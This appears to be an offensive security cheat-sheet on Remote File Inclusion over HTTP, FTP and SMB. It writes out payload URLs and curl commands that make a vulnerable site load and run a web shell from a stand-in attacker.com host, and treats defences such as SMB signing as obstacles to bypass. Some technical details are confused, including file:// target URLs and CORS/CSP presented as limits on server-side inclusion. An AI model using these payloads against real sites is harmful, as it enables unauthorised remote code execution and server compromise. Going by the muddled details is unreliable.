---
# 🌐 Remote File Inclusion (RFI) - HTTP, FTP, SMB

> [!ABSTRACT] Overview of RFI Attack Methods
>
> This note covers three methods to perform a remote file inclusion attack: via HTTP, FTP, and SMB protocols. Each method involves including an external shell script or executable from the attacker's server.

---

## 🌐 Method 1 - HTTP (http://attacker.com/shell.php)

### Payload Example

```text
http://vulnerable-site.com/?file=http://attacker.com/shell.php
```

> [!SUCCESS] Successful Inclusion of Shell via HTTP
>
> If the web application is vulnerable, the shell located at `http://attacker.com/shell.php` will be executed on the server.

---

## 🌐 Method 2 - FTP (ftp://attacker.com/shell.php)

### Payload Example

```text
file:///C:/path/to/vulnerable-app/?file=ftp://attacker.com/shell.php
```

> [!SUCCESS] Successful Inclusion of Shell via FTP
>
> If the web application is configured to allow file inclusion from an FTP source, it will execute the shell located at `ftp://attacker.com/shell.php`.

---

## 🌐 Method 3 - SMB (\\\attacker.com\share\shell.php)

### Payload Example

```text
file:///C:/path/to/vulnerable-app/?file=\\attacker.com\share\shell.php
```

> [!SUCCESS] Successful Inclusion of Shell via SMB
>
> If the web application is vulnerable to including files from a network share, it will execute the shell located at `\\attacker.com\share\shell.php`.

---

## 🛠️ Verification Steps

### HTTP Method Verification

1. Ensure that the target URL can be accessed without modification.
2. Modify the URL to include the payload as shown above.

```bash
curl -I http://vulnerable-site.com/?file=http://attacker.com/shell.php
```

> [!CHECK] Verify Shell Inclusion via HTTP
>
> Check if the response includes any signs of shell execution, such as unexpected server responses or errors related to file inclusion.

---

### FTP Method Verification

1. Ensure that FTP access is possible from the target application.
2. Attempt to include the payload using a URL like `ftp://attacker.com/shell.php`.

```bash
curl -I http://vulnerable-site.com/?file=ftp://attacker.com/shell.php
```

> [!CHECK] Verify Shell Inclusion via FTP
>
> Confirm that the file inclusion from an FTP source is successful by checking server logs or application behavior.

---

### SMB Method Verification

1. Ensure that network shares are accessible and correctly configured.
2. Attempt to include a payload referencing a network share.

```bash
curl -I http://vulnerable-site.com/?file=\\attacker.com\share\shell.php
```

> [!CHECK] Verify Shell Inclusion via SMB
>
> Check the server logs or application behavior for signs of successful file inclusion from the shared directory.

---

## 🛠️ Potential Errors and Warnings

### Common Failures

- **403 Forbidden** - The web application may block external requests.
- **500 Internal Server Error** - File inclusion might be restricted by server configuration or security measures.

> [!FAILURE] Failed Inclusion via HTTP
>
> If the payload fails, check if there are restrictions on external file inclusions or if the path is incorrect.

---

## 🛠️ Potential Errors and Warnings

### FTP Failures

- **Network Issues** - Ensure that FTP connections to `attacker.com` are stable.
- **Permissions Denied** - The application might not have permission to access remote files via FTP.

> [!FAILURE] Failed Inclusion via FTP
>
> If the inclusion fails, verify FTP connectivity and permissions for accessing external resources from the web application.

---

### SMB Failures

- **Network Share Access Issues** - Ensure that the network share is correctly configured.
- **SMB Protocol Restrictions** - The target server might not allow file inclusions over SMB.

> [!FAILURE] Failed Inclusion via SMB
>
> If inclusion fails, check for correct configuration of SMB shares and verify access permissions from the application.

---

## 🔒 Security Considerations

### HTTP Method Security

- **CORS Policy**: Check if Cross-Origin Resource Sharing (CORS) policy restricts external file inclusions.
- **Content-Security-Policy**: Ensure that Content Security Policies do not block external resources.

> [!WARNING] Potential for CORS and CSP Restrictions
>
> Be aware of security policies that may prevent successful RFI attacks via HTTP.

---

### FTP Method Security

- **FTP Configuration**: Validate the FTP server configuration to ensure it is not misconfigured.
- **Firewall Rules**: Ensure no firewall rules block FTP connections from the web application.

> [!WARNING] Potential for Misconfiguration and Firewall Issues
>
> Be cautious of security configurations that might prevent FTP-based RFI attacks.

---

### SMB Method Security

- **SMB Signing**: Confirm that SMB signing is not enabled, as it can prevent successful file inclusions.
- **Access Control Lists (ACLs)**: Ensure ACL settings do not restrict access to network shares.

> [!WARNING] Potential for Misconfiguration and Access Restrictions
>
> Verify SMB security settings and ensure proper permissions are set for network shares.

---

## 📝 Example Commands

### HTTP Method Command

```bash
curl -I http://vulnerable-site.com/?file=http://attacker.com/shell.php
```

### FTP Method Command

```bash
curl -I http://vulnerable-site.com/?file=ftp://attacker.com/shell.php
```

### SMB Method Command

```bash
curl -I http://vulnerable-site.com/?file=\\attacker.com\share\shell.php
```

---

## 📝 Important Points to Remember

- **HTTP**: Check for restrictions and verify server responses.
- **FTP**: Ensure stable connections and correct FTP configuration.
- **SMB**: Confirm SMB settings and network share permissions.

> [!NOTE] Always Document the Steps and Verify Results
>
> Record all steps taken, and document any results or errors encountered during testing.